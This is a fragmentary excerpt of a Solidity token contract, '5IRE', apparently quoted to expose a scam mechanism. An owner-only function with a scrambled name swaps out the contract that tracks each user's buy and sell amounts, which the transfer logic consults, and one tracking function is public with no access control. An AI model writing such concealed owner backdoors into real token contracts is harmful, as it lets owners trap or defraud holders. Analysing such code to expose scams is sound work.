...
contract UserAmountChange is IUserAmountChange{
    ...
    function addOutAmount(address account, uint256 amount) public {
        outAmount[account] = outAmount[account].add(amount);
    }
    function addInAmount(address account, uint256 amount) public {
...
contract TokenM is ERC20 {
    ...
    IUserAmountChange public apprshange;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;

    constructor(address tokenOwner) ERC20("5IRE", "5IRE") {
		...
		uint256 total = 9999999 * 10**18;
        apprshange = new UserAmountChange();
    ...
    function shangeAppeSoupntVoer(IUserAmountChange _apprshange) public onlyOwner {
        apprshange = _apprshange;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                apprshange.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				apprshange.addOutAmount(from, amount);
            }else{
                apprshange.addOutAmount(from, amount);
                takeFee = false;
            }
